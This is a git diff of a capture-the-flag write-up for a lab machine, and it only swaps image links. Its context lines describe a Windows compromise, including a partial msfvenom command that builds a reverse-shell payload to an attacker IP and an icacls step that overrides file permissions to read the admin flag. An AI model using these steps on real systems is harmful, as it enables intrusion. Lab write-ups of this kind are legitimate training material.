@@ -4,7 +4,7 @@
 
 Nmap scan:
 
-![](<../../../.gitbook/assets/image%20(2071).png>)
+![](../../../.gitbook/assets/chatterbox-1.png)
 
 Port 9256 was a rather unusual port to be open.
 
@@ -26,7 +26,7 @@ msfvenom -a x86 --platform Windows -p windows/shell_reverse_tcp LHOST=10.10.16.5
 
 Then, we can run the script and a shell would pop on our listener port.
 
-![](<../../../.gitbook/assets/image%20(3681).png>)
+![](../../../.gitbook/assets/chatterbox-4.png)
 
 ## Privilege Escalation
 
@@ -34,18 +34,18 @@ Then, we can run the script and a shell would pop on our listener port.
 
 When I ran WinPEASx64 on this machine, there was a lot of indication that we had AllAccess to the administrator's desktop.
 
-![](<../../../.gitbook/assets/image%20(754).png>)
+![](../../../.gitbook/assets/chatterbox-6.png)
 
 However, we cannot read the root flag for some reason.
 
-![](<../../../.gitbook/assets/image%20(3376).png>)
+![](../../../.gitbook/assets/chatterbox-3.png)
 
 We can check the permissions using `icacls`.
 
-![](<../../../.gitbook/assets/image%20(733).png>)
+![](../../../.gitbook/assets/chatterbox-5.png)
 
 So we the user have Full Control over the Desktop (that's what (F) means), but the flag has been configured like so. To cirumvent this, we can grant ourselves the permission to read the files.
 
-![](<../../../.gitbook/assets/image%20(2241).png>)
+![](../../../.gitbook/assets/chatterbox-2.png)
 
 Then, we can read the root flag.
